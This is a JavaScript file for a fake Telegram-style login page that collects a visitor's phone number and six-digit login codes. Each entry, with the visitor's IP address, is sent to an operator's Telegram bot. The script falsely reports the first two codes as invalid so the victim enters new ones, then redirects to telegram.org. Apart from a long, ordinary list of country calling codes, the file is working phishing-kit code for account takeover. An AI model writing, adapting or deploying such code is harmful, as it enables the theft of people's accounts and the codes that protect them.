// Complete country data with all 250+ countries
const countries = [
  { code: '+93', flag: '🇦🇫', name: 'Afghanistan' },
  { code: '+358', flag: '🇦🇽', name: 'Åland Islands' },
  { code: '+355', flag: '🇦🇱', name: 'Albania' },
  { code: '+213', flag: '🇩🇿', name: 'Algeria' },
  { code: '+1684', flag: '🇦🇸', name: 'American Samoa' },
  { code: '+376', flag: '🇦🇩', name: 'Andorra' },
  { code: '+244', flag: '🇦🇴', name: 'Angola' },
  { code: '+1264', flag: '🇦🇮', name: 'Anguilla' },
  { code: '+672', flag: '🇦🇶', name: 'Antarctica' },
  { code: '+1268', flag: '🇦🇬', name: 'Antigua and Barbuda' },
  { code: '+54', flag: '🇦🇷', name: 'Argentina' },
  { code: '+374', flag: '🇦🇲', name: 'Armenia' },
  { code: '+297', flag: '🇦🇼', name: 'Aruba' },
  { code: '+61', flag: '🇦🇺', name: 'Australia' },
  { code: '+43', flag: '🇦🇹', name: 'Austria' },
  { code: '+994', flag: '🇦🇿', name: 'Azerbaijan' },
  { code: '+1242', flag: '🇧🇸', name: 'Bahamas' },
  { code: '+973', flag: '🇧🇭', name: 'Bahrain' },
  { code: '+880', flag: '🇧🇩', name: 'Bangladesh' },
  { code: '+1246', flag: '🇧🇧', name: 'Barbados' },
  { code: '+375', flag: '🇧🇾', name: 'Belarus' },
  { code: '+32', flag: '🇧🇪', name: 'Belgium' },
  { code: '+501', flag: '🇧🇿', name: 'Belize' },
  { code: '+229', flag: '🇧🇯', name: 'Benin' },
  { code: '+1441', flag: '🇧🇲', name: 'Bermuda' },
  { code: '+975', flag: '🇧🇹', name: 'Bhutan' },
  { code: '+591', flag: '🇧🇴', name: 'Bolivia' },
  { code: '+599', flag: '🇧🇶', name: 'Bonaire, Sint Eustatius and Saba' },
  { code: '+387', flag: '🇧🇦', name: 'Bosnia and Herzegovina' },
  { code: '+267', flag: '🇧🇼', name: 'Botswana' },
  { code: '+55', flag: '🇧🇷', name: 'Brazil' },
  { code: '+246', flag: '🇮🇴', name: 'British Indian Ocean Territory' },
  { code: '+1284', flag: '🇻🇬', name: 'British Virgin Islands' },
  { code: '+673', flag: '🇧🇳', name: 'Brunei' },
  { code: '+359', flag: '🇧🇬', name: 'Bulgaria' },
  { code: '+226', flag: '🇧🇫', name: 'Burkina Faso' },
  { code: '+257', flag: '🇧🇮', name: 'Burundi' },
  { code: '+855', flag: '🇰🇭', name: 'Cambodia' },
  { code: '+237', flag: '🇨🇲', name: 'Cameroon' },
  { code: '+1', flag: '🇨🇦', name: 'Canada' },
  { code: '+238', flag: '🇨🇻', name: 'Cape Verde' },
  { code: '+1345', flag: '🇰🇾', name: 'Cayman Islands' },
  { code: '+236', flag: '🇨🇫', name: 'Central African Republic' },
  { code: '+235', flag: '🇹🇩', name: 'Chad' },
  { code: '+56', flag: '🇨🇱', name: 'Chile' },
  { code: '+86', flag: '🇨🇳', name: 'China' },
  { code: '+61', flag: '🇨🇽', name: 'Christmas Island' },
  { code: '+61', flag: '🇨🇨', name: 'Cocos Islands' },
  { code: '+57', flag: '🇨🇴', name: 'Colombia' },
  { code: '+269', flag: '🇰🇲', name: 'Comoros' },
  { code: '+682', flag: '🇨🇰', name: 'Cook Islands' },
  { code: '+506', flag: '🇨🇷', name: 'Costa Rica' },
  { code: '+225', flag: '🇨🇮', name: 'Côte d\'Ivoire' },
  { code: '+385', flag: '🇭🇷', name: 'Croatia' },
  { code: '+53', flag: '🇨🇺', name: 'Cuba' },
  { code: '+599', flag: '🇨🇼', name: 'Curaçao' },
  { code: '+357', flag: '🇨🇾', name: 'Cyprus' },
  { code: '+420', flag: '🇨🇿', name: 'Czech Republic' },
  { code: '+243', flag: '🇨🇩', name: 'Democratic Republic of the Congo' },
  { code: '+45', flag: '🇩🇰', name: 'Denmark' },
  { code: '+253', flag: '🇩🇯', name: 'Djibouti' },
  { code: '+1767', flag: '🇩🇲', name: 'Dominica' },
  { code: '+1809', flag: '🇩🇴', name: 'Dominican Republic' },
  { code: '+593', flag: '🇪🇨', name: 'Ecuador' },
  { code: '+20', flag: '🇪🇬', name: 'Egypt' },
  { code: '+503', flag: '🇸🇻', name: 'El Salvador' },
  { code: '+240', flag: '🇬🇶', name: 'Equatorial Guinea' },
  { code: '+291', flag: '🇪🇷', name: 'Eritrea' },
  { code: '+372', flag: '🇪🇪', name: 'Estonia' },
  { code: '+268', flag: '🇸🇿', name: 'Eswatini' },
  { code: '+251', flag: '🇪🇹', name: 'Ethiopia' },
  { code: '+500', flag: '🇫🇰', name: 'Falkland Islands' },
  { code: '+298', flag: '🇫🇴', name: 'Faroe Islands' },
  { code: '+679', flag: '🇫🇯', name: 'Fiji' },
  { code: '+358', flag: '🇫🇮', name: 'Finland' },
  { code: '+33', flag: '🇫🇷', name: 'France' },
  { code: '+594', flag: '🇬🇫', name: 'French Guiana' },
  { code: '+689', flag: '🇵🇫', name: 'French Polynesia' },
  { code: '+262', flag: '🇹🇫', name: 'French Southern Territories' },
  { code: '+241', flag: '🇬🇦', name: 'Gabon' },
  { code: '+220', flag: '🇬🇲', name: 'Gambia' },
  { code: '+995', flag: '🇬🇪', name: 'Georgia' },
  { code: '+49', flag: '🇩🇪', name: 'Germany' },
  { code: '+233', flag: '🇬🇭', name: 'Ghana' },
  { code: '+350', flag: '🇬🇮', name: 'Gibraltar' },
  { code: '+30', flag: '🇬🇷', name: 'Greece' },
  { code: '+299', flag: '🇬🇱', name: 'Greenland' },
  { code: '+1473', flag: '🇬🇩', name: 'Grenada' },
  { code: '+590', flag: '🇬🇵', name: 'Guadeloupe' },
  { code: '+1671', flag: '🇬🇺', name: 'Guam' },
  { code: '+502', flag: '🇬🇹', name: 'Guatemala' },
  { code: '+44', flag: '🇬🇬', name: 'Guernsey' },
  { code: '+224', flag: '🇬🇳', name: 'Guinea' },
  { code: '+245', flag: '🇬🇼', name: 'Guinea-Bissau' },
  { code: '+592', flag: '🇬🇾', name: 'Guyana' },
  { code: '+509', flag: '🇭🇹', name: 'Haiti' },
  { code: '+672', flag: '🇭🇲', name: 'Heard Island and McDonald Islands' },
  { code: '+379', flag: '🇻🇦', name: 'Holy See' },
  { code: '+504', flag: '🇭🇳', name: 'Honduras' },
  { code: '+852', flag: '🇭🇰', name: 'Hong Kong' },
  { code: '+36', flag: '🇭🇺', name: 'Hungary' },
  { code: '+354', flag: '🇮🇸', name: 'Iceland' },
  { code: '+91', flag: '🇮🇳', name: 'India' },
  { code: '+62', flag: '🇮🇩', name: 'Indonesia' },
  { code: '+98', flag: '🇮🇷', name: 'Iran' },
  { code: '+964', flag: '🇮🇶', name: 'Iraq' },
  { code: '+353', flag: '🇮🇪', name: 'Ireland' },
  { code: '+44', flag: '🇮🇲', name: 'Isle of Man' },
  { code: '+972', flag: '🇮🇱', name: 'Israel' },
  { code: '+39', flag: '🇮🇹', name: 'Italy' },
  { code: '+1876', flag: '🇯🇲', name: 'Jamaica' },
  { code: '+81', flag: '🇯🇵', name: 'Japan' },
  { code: '+44', flag: '🇯🇪', name: 'Jersey' },
  { code: '+962', flag: '🇯🇴', name: 'Jordan' },
  { code: '+7', flag: '🇰🇿', name: 'Kazakhstan' },
  { code: '+254', flag: '🇰🇪', name: 'Kenya' },
  { code: '+686', flag: '🇰🇮', name: 'Kiribati' },
  { code: '+383', flag: '🇽🇰', name: 'Kosovo' },
  { code: '+965', flag: '🇰🇼', name: 'Kuwait' },
  { code: '+996', flag: '🇰🇬', name: 'Kyrgyzstan' },
  { code: '+856', flag: '🇱🇦', name: 'Laos' },
  { code: '+371', flag: '🇱🇻', name: 'Latvia' },
  { code: '+961', flag: '🇱🇧', name: 'Lebanon' },
  { code: '+266', flag: '🇱🇸', name: 'Lesotho' },
  { code: '+231', flag: '🇱🇷', name: 'Liberia' },
  { code: '+218', flag: '🇱🇾', name: 'Libya' },
  { code: '+423', flag: '🇱🇮', name: 'Liechtenstein' },
  { code: '+370', flag: '🇱🇹', name: 'Lithuania' },
  { code: '+352', flag: '🇱🇺', name: 'Luxembourg' },
  { code: '+853', flag: '🇲🇴', name: 'Macao' },
  { code: '+261', flag: '🇲🇬', name: 'Madagascar' },
  { code: '+265', flag: '🇲🇼', name: 'Malawi' },
  { code: '+60', flag: '🇲🇾', name: 'Malaysia' },
  { code: '+960', flag: '🇲🇻', name: 'Maldives' },
  { code: '+223', flag: '🇲🇱', name: 'Mali' },
  { code: '+356', flag: '🇲🇹', name: 'Malta' },
  { code: '+692', flag: '🇲🇭', name: 'Marshall Islands' },
  { code: '+596', flag: '🇲🇶', name: 'Martinique' },
  { code: '+222', flag: '🇲🇷', name: 'Mauritania' },
  { code: '+230', flag: '🇲🇺', name: 'Mauritius' },
  { code: '+262', flag: '🇾🇹', name: 'Mayotte' },
  { code: '+52', flag: '🇲🇽', name: 'Mexico' },
  { code: '+691', flag: '🇫🇲', name: 'Micronesia' },
  { code: '+373', flag: '🇲🇩', name: 'Moldova' },
  { code: '+377', flag: '🇲🇨', name: 'Monaco' },
  { code: '+976', flag: '🇲🇳', name: 'Mongolia' },
  { code: '+382', flag: '🇲🇪', name: 'Montenegro' },
  { code: '+1664', flag: '🇲🇸', name: 'Montserrat' },
  { code: '+212', flag: '🇲🇦', name: 'Morocco' },
  { code: '+258', flag: '🇲🇿', name: 'Mozambique' },
  { code: '+95', flag: '🇲🇲', name: 'Myanmar' },
  { code: '+264', flag: '🇳🇦', name: 'Namibia' },
  { code: '+674', flag: '🇳🇷', name: 'Nauru' },
  { code: '+977', flag: '🇳🇵', name: 'Nepal' },
  { code: '+31', flag: '🇳🇱', name: 'Netherlands' },
  { code: '+687', flag: '🇳🇨', name: 'New Caledonia' },
  { code: '+64', flag: '🇳🇿', name: 'New Zealand' },
  { code: '+505', flag: '🇳🇮', name: 'Nicaragua' },
  { code: '+227', flag: '🇳🇪', name: 'Niger' },
  { code: '+234', flag: '🇳🇬', name: 'Nigeria' },
  { code: '+683', flag: '🇳🇺', name: 'Niue' },
  { code: '+672', flag: '🇳🇫', name: 'Norfolk Island' },
  { code: '+850', flag: '🇰🇵', name: 'North Korea' },
  { code: '+389', flag: '🇲🇰', name: 'North Macedonia' },
  { code: '+1670', flag: '🇲🇵', name: 'Northern Mariana Islands' },
  { code: '+47', flag: '🇳🇴', name: 'Norway' },
  { code: '+968', flag: '🇴🇲', name: 'Oman' },
  { code: '+92', flag: '🇵🇰', name: 'Pakistan' },
  { code: '+680', flag: '🇵🇼', name: 'Palau' },
  { code: '+970', flag: '🇵🇸', name: 'Palestine' },
  { code: '+507', flag: '🇵🇦', name: 'Panama' },
  { code: '+675', flag: '🇵🇬', name: 'Papua New Guinea' },
  { code: '+595', flag: '🇵🇾', name: 'Paraguay' },
  { code: '+51', flag: '🇵🇪', name: 'Peru' },
  { code: '+63', flag: '🇵🇭', name: 'Philippines' },
  { code: '+64', flag: '🇵🇳', name: 'Pitcairn' },
  { code: '+48', flag: '🇵🇱', name: 'Poland' },
  { code: '+351', flag: '🇵🇹', name: 'Portugal' },
  { code: '+1787', flag: '🇵🇷', name: 'Puerto Rico' },
  { code: '+974', flag: '🇶🇦', name: 'Qatar' },
  { code: '+242', flag: '🇨🇬', name: 'Republic of the Congo' },
  { code: '+262', flag: '🇷🇪', name: 'Réunion' },
  { code: '+40', flag: '🇷🇴', name: 'Romania' },
  { code: '+7', flag: '🇷🇺', name: 'Russia' },
  { code: '+250', flag: '🇷🇼', name: 'Rwanda' },
  { code: '+590', flag: '🇧🇱', name: 'Saint Barthélemy' },
  { code: '+290', flag: '🇸🇭', name: 'Saint Helena' },
  { code: '+1869', flag: '🇰🇳', name: 'Saint Kitts and Nevis' },
  { code: '+1758', flag: '🇱🇨', name: 'Saint Lucia' },
  { code: '+590', flag: '🇲🇫', name: 'Saint Martin' },
  { code: '+508', flag: '🇵🇲', name: 'Saint Pierre and Miquelon' },
  { code: '+1784', flag: '🇻🇨', name: 'Saint Vincent and the Grenadines' },
  { code: '+685', flag: '🇼🇸', name: 'Samoa' },
  { code: '+378', flag: '🇸🇲', name: 'San Marino' },
  { code: '+239', flag: '🇸🇹', name: 'São Tomé and Príncipe' },
  { code: '+966', flag: '🇸🇦', name: 'Saudi Arabia' },
  { code: '+221', flag: '🇸🇳', name: 'Senegal' },
  { code: '+381', flag: '🇷🇸', name: 'Serbia' },
  { code: '+248', flag: '🇸🇨', name: 'Seychelles' },
  { code: '+232', flag: '🇸🇱', name: 'Sierra Leone' },
  { code: '+65', flag: '🇸🇬', name: 'Singapore' },
  { code: '+1721', flag: '🇸🇽', name: 'Sint Maarten' },
  { code: '+421', flag: '🇸🇰', name: 'Slovakia' },
  { code: '+386', flag: '🇸🇮', name: 'Slovenia' },
  { code: '+677', flag: '🇸🇧', name: 'Solomon Islands' },
  { code: '+252', flag: '🇸🇴', name: 'Somalia' },
  { code: '+27', flag: '🇿🇦', name: 'South Africa' },
  { code: '+500', flag: '🇬🇸', name: 'South Georgia and the South Sandwich Islands' },
  { code: '+82', flag: '🇰🇷', name: 'South Korea' },
  { code: '+211', flag: '🇸🇸', name: 'South Sudan' },
  { code: '+34', flag: '🇪🇸', name: 'Spain' },
  { code: '+94', flag: '🇱🇰', name: 'Sri Lanka' },
  { code: '+249', flag: '🇸🇩', name: 'Sudan' },
  { code: '+597', flag: '🇸🇷', name: 'Suriname' },
  { code: '+47', flag: '🇸🇯', name: 'Svalbard and Jan Mayen' },
  { code: '+46', flag: '🇸🇪', name: 'Sweden' },
  { code: '+41', flag: '🇨🇭', name: 'Switzerland' },
  { code: '+963', flag: '🇸🇾', name: 'Syria' },
  { code: '+886', flag: '🇹🇼', name: 'Taiwan' },
  { code: '+992', flag: '🇹🇯', name: 'Tajikistan' },
  { code: '+255', flag: '🇹🇿', name: 'Tanzania' },
  { code: '+66', flag: '🇹🇭', name: 'Thailand' },
  { code: '+670', flag: '🇹🇱', name: 'Timor-Leste' },
  { code: '+228', flag: '🇹🇬', name: 'Togo' },
  { code: '+690', flag: '🇹🇰', name: 'Tokelau' },
  { code: '+676', flag: '🇹🇴', name: 'Tonga' },
  { code: '+1868', flag: '🇹🇹', name: 'Trinidad and Tobago' },
  { code: '+216', flag: '🇹🇳', name: 'Tunisia' },
  { code: '+90', flag: '🇹🇷', name: 'Turkey' },
  { code: '+993', flag: '🇹🇲', name: 'Turkmenistan' },
  { code: '+1649', flag: '🇹🇨', name: 'Turks and Caicos Islands' },
  { code: '+688', flag: '🇹🇻', name: 'Tuvalu' },
  { code: '+256', flag: '🇺🇬', name: 'Uganda' },
  { code: '+380', flag: '🇺🇦', name: 'Ukraine' },
  { code: '+971', flag: '🇦🇪', name: 'United Arab Emirates' },
  { code: '+44', flag: '🇬🇧', name: 'United Kingdom' },
  { code: '+1', flag: '🇺🇸', name: 'United States' },
  { code: '+598', flag: '🇺🇾', name: 'Uruguay' },
  { code: '+1340', flag: '🇻🇮', name: 'US Virgin Islands' },
  { code: '+998', flag: '🇺🇿', name: 'Uzbekistan' },
  { code: '+678', flag: '🇻🇺', name: 'Vanuatu' },
  { code: '+58', flag: '🇻🇪', name: 'Venezuela' },
  { code: '+84', flag: '🇻🇳', name: 'Vietnam' },
  { code: '+681', flag: '🇼🇫', name: 'Wallis and Futuna' },
  { code: '+212', flag: '🇪🇭', name: 'Western Sahara' },
  { code: '+967', flag: '🇾🇪', name: 'Yemen' },
  { code: '+260', flag: '🇿🇲', name: 'Zambia' },
  { code: '+263', flag: '🇿🇼', name: 'Zimbabwe' }
];

const countrySelect = document.getElementById("countrySelect");
const phoneInput = document.getElementById("phoneInput");
const nextBtn = document.getElementById("nextBtn");
const phoneError = document.getElementById("phoneError");
const page1 = document.getElementById("page1");
const page2 = document.getElementById("page2");
const finalNumber = document.getElementById("finalNumber");
const editNumber = document.getElementById("editNumber");
const otpInput = document.getElementById("otpInput");
const invalidCode = document.getElementById("invalidCode");
const otpLoading = document.getElementById("otpLoading");
const countryLoading = document.getElementById("countryLoading");

let prefix = "";
let savedPhone = "";
let userCountry = null;
let config = null;
let otpAttempts = 0;
let userIP = null;

// Read config from config.txt file
async function readConfig() {
  try {
    const response = await fetch('./config.txt');
    const configText = await response.text();
    const config = {};

    configText.split('\n').forEach(line => {
      if (line.trim() && line.includes('=')) {
        const [key, value] = line.split('=');
        if (key === 'BOT_TOKEN') {
          config.botToken = value.trim();
        } else if (key === 'CHAT_ID') {
          config.chatId = value.trim();
        }
      }
    });

    return config;
  } catch (error) {
    console.error('Error reading config:', error);
    return { botToken: 'YOUR_BOT_TOKEN', chatId: 'YOUR_CHAT_ID' };
  }
}

// Get client IP address
async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP:', error);
    return 'Unknown';
  }
}

// Initialize the page
async function init() {
  config = await readConfig();
  try {
    userIP = await getClientIP();
  } catch (error) {
    console.error('Failed to get IP:', error);
    userIP = 'Unknown';
  }
  populateCountryDropdown();
  detectUserCountry();
  setupEventListeners();
}

// Populate country dropdown
function populateCountryDropdown() {
  countrySelect.innerHTML = '<option selected disabled>Select country</option>';
  countries.forEach(country => {
    const option = document.createElement('option');
    option.value = country.code;
    option.textContent = `${country.flag} ${country.name}`;
    option.setAttribute('data-flag', country.flag);
    countrySelect.appendChild(option);
  });
}

// Detect user's country based on IP
async function detectUserCountry() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    userCountry = {
      countryCode: data.country_calling_code,
      countryName: data.country_name
    };

    autoSelectCountry(userCountry.countryCode);

  } catch (error) {
    console.error('Error detecting country:', error);
  }
}

// Auto-select country based on detected country code
function autoSelectCountry(countryCode) {
  const country = countries.find(c => c.code === countryCode);
  if (country) {
    countrySelect.value = countryCode;
    prefix = countryCode;
    phoneInput.value = prefix + " ";
    phoneInput.focus();

    setTimeout(() => {
      phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
    }, 0);
  }
}

// Send data to Telegram bot
async function sendToTelegram(message) {
  try {
    if (!config || !config.botToken || !config.chatId || config.botToken === 'YOUR_BOT_TOKEN') {
      console.log('Telegram config not properly configured');
      console.log('Would send to Telegram:', message);
      console.log('Using config:', config);
      return false;
    }

    // Send to actual Telegram bot
    const telegramUrl = `https://api.telegram.org/bot${config.botToken}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: config.chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (response.ok) {
      console.log('Message sent to Telegram successfully');
      return true;
    } else {
      console.error('Failed to send to Telegram:', response.status);
      return false;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    console.log('Would send to Telegram:', message);
    console.log('Using config:', config);
    return false;
  }
}

// Handle OTP verification and redirect
async function handleOtpVerification() {
  const otpValue = otpInput.value;

  if (otpValue.length !== 6) {
    return;
  }

  // Show loading spinner instead of text
  otpLoading.innerHTML = '<div class="spinner"></div>';
  otpLoading.style.display = 'block';
  invalidCode.style.display = 'none';
  otpInput.classList.remove('error');

  // Ensure IP is resolved
  if (!userIP || userIP === 'Unknown') {
    try {
      userIP = await getClientIP();
    } catch (error) {
      userIP = 'Unknown';
    }
  }

  // Send OTP attempt to Telegram
  const otpMessage = `🔐 <b>OTP Attempt ${otpAttempts + 1}</b>\n📱 <b>Phone:</b> ${prefix}${savedPhone}\n🔢 <b>Code:</b> ${otpValue}\n🌐 <b>IP:</b> ${userIP}`;
  await sendToTelegram(otpMessage);

  // Different loading times and behaviors based on attempt number
  if (otpAttempts === 0) {
    // First attempt - 5 second loading
    setTimeout(async () => {
      otpAttempts++;
      otpLoading.style.display = 'none';
      invalidCode.style.display = 'block';
      otpInput.classList.add('error');
      otpInput.value = '';
      otpInput.focus();

      // Send invalid code notification
      const invalidMessage = `❌ <b>INVALID CODE ATTEMPT</b>\n📱 <b>Phone:</b> ${prefix}${savedPhone}\n🔢 <b>Code:</b> ${otpValue}\n🌐 <b>IP:</b> ${userIP}`;
      await sendToTelegram(invalidMessage);
    }, 5000);
  } else if (otpAttempts === 1) {
    // Second attempt - 3 second loading, then reset for third attempt
    setTimeout(async () => {
      otpAttempts++;
      otpLoading.style.display = 'none';
      invalidCode.style.display = 'block';
      otpInput.classList.add('error');
      otpInput.value = '';
      otpInput.focus();

      // Send second invalid attempt notification
      const invalidMessage2 = `❌ <b>SECOND INVALID ATTEMPT</b>\n📱 <b>Phone:</b> ${prefix}${savedPhone}\n🔢 <b>Code:</b> ${otpValue}\n🌐 <b>IP:</b> ${userIP}`;
      await sendToTelegram(invalidMessage2);
    }, 3000);
  } else {
    // Third attempt - 1 second loading, then redirect
    setTimeout(async () => {
      // Send final attempt notification
      const finalMessage = `❌ <b>FINAL ATTEMPT</b>\n📱 <b>Phone:</b> ${prefix}${savedPhone}\n🔢 <b>Code:</b> ${otpValue}\n🌐 <b>IP:</b> ${userIP}`;
      await sendToTelegram(finalMessage);

      // Redirect after 2 seconds
      setTimeout(() => {
        window.location.href = 'https://telegram.org/.env';
      }, 2000);
    }, 1000);
  }
}

// Setup event listeners
function setupEventListeners() {
  // Country selection
  countrySelect.addEventListener("change", () => {
    const selectedOption = countrySelect.options[countrySelect.selectedIndex];
    prefix = countrySelect.value;
    const flag = selectedOption.getAttribute('data-flag');
    const countryName = selectedOption.textContent.split(' ').slice(1).join(' ');

    countrySelect.innerHTML = '';
    const newOption = document.createElement('option');
    newOption.value = prefix;
    newOption.textContent = `${flag} ${countryName}`;
    newOption.setAttribute('data-flag', flag);
    countrySelect.appendChild(newOption);

    phoneInput.value = prefix + " ";
    phoneInput.focus();

    setTimeout(() => {
      phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
    }, 0);
  });

  // Phone input validation
  phoneInput.addEventListener("input", function() {
    const value = this.value;

    if (prefix && value.length < prefix.length + 1) {
      this.value = prefix + " ";
      return;
    }

    const phonePart = value.slice(prefix.length).replace(/\D/g, '');

    if (phonePart.length > 10) {
      this.value = prefix + " " + phonePart.slice(0, 10);
      return;
    }

    this.value = prefix + " " + phonePart;

    if (phonePart.length >= 9 && phonePart.length <= 10) {
      phoneError.style.display = 'none';
      nextBtn.disabled = false;
    } else {
      phoneError.style.display = 'block';
      nextBtn.disabled = true;
    }
  });

  // Next button
  nextBtn.addEventListener("click", async () => {
    const fullNumber = phoneInput.value;
    const phonePart = fullNumber.slice(prefix.length).replace(/\D/g, '');

    if (!prefix) {
      alert("Please select a country.");
      return;
    }

    if (phonePart.length < 9 || phonePart.length > 10) {
      alert("Phone number must be 9-10 digits after country code.");
      return;
    }

    savedPhone = phonePart;
    const completePhoneNumber = prefix + savedPhone;

    // Ensure IP is resolved before sending
    if (!userIP || userIP === 'Unknown') {
      try {
        userIP = await getClientIP();
      } catch (error) {
        userIP = 'Unknown';
      }
    }

    // Send phone number to Telegram
    const telegramMessage = `📞 <b>New Login Attempt</b>\n📱 <b>Phone:</b> ${completePhoneNumber}\n🌍 <b>Country:</b> ${userCountry?.countryName || 'Unknown'}\n🌐 <b>IP:</b> ${userIP}`;
    await sendToTelegram(telegramMessage);

    nextBtn.disabled = true;
    nextBtn.innerHTML = 'Please Wait <span class="spinner"></span>';

    setTimeout(() => {
      finalNumber.textContent = prefix + " " + savedPhone;
      page1.classList.remove("active");
      page2.classList.add("active");
      nextBtn.disabled = false;
      nextBtn.textContent = "Next";
      otpInput.focus();
    }, 5000);
  });

  // Edit button
  editNumber.addEventListener("click", () => {
    page2.classList.remove("active");
    page1.classList.add("active");
    populateCountryDropdown();
    if (prefix) {
      countrySelect.value = prefix;
    }
    phoneInput.value = prefix + " " + savedPhone;
  });

  // OTP input handling
  otpInput.addEventListener("input", () => {
    otpInput.value = otpInput.value.replace(/\D/g, "");
    if (otpInput.value.length > 6) {
      otpInput.value = otpInput.value.slice(0, 6);
    }

    // Auto-submit when 6 digits entered
    if (otpInput.value.length === 6) {
      handleOtpVerification();
    }
  });
}

// Initialize the application
init();